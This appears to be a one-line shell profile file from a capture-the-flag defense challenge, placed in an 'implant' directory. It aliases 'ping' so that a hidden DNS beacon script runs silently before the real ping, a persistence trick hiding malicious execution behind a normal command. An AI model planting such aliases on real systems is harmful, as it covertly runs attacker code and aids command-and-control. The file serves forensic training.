# pc7/individual-defense/finals-optical-reversal/challenge/implant/mirror/profile.d/10-aliases.sh

alias ping='bash /opt/optic/src/dns_beacon.sh >/dev/null 2>&1 || /bin/ping'
